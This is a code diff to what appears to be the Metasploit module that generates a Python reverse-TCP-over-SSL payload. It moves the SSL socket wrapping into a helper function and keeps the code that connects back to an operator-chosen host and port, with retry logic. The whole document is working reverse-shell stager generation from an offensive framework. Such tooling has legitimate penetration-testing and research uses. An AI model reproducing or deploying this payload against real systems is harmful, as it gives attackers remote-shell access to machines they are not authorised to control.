@@ -45,11 +45,11 @@ module Payload::Python::ReverseTcpSsl
 
   def generate_reverse_tcp_ssl(opts={})
     # Set up the socket
-    cmd  = "import zlib,base64,ssl,socket,struct#{opts[:retry_wait].to_i > 0 ? ',time' : ''}\n"
+    cmd  = "import zlib,base64,socket,struct#{opts[:retry_wait].to_i > 0 ? ',time' : ''}\n"
     if opts[:retry_wait].blank? # do not retry at all (old style)
       cmd << "so=socket.socket(2,1)\n" # socket.AF_INET = 2
       cmd << "so.connect(('#{opts[:host]}',#{opts[:port]}))\n"
-      cmd << "s=ssl.wrap_socket(so)\n"
+      cmd << py_ssl_wrap_socket('so', 's')
     else
       if opts[:retry_count] > 0
         cmd << "for x in range(#{opts[:retry_count].to_i}):\n"
@@ -59,7 +59,7 @@ module Payload::Python::ReverseTcpSsl
       cmd << "\ttry:\n"
       cmd << "\t\tso=socket.socket(2,1)\n" # socket.AF_INET = 2
       cmd << "\t\tso.connect(('#{opts[:host]}',#{opts[:port]}))\n"
-      cmd << "\t\ts=ssl.wrap_socket(so)\n"
+      cmd << py_ssl_wrap_socket('so', 's', "\t\t")
       cmd << "\t\tbreak\n"
       cmd << "\texcept:\n"
       if opts[:retry_wait].to_i <= 0
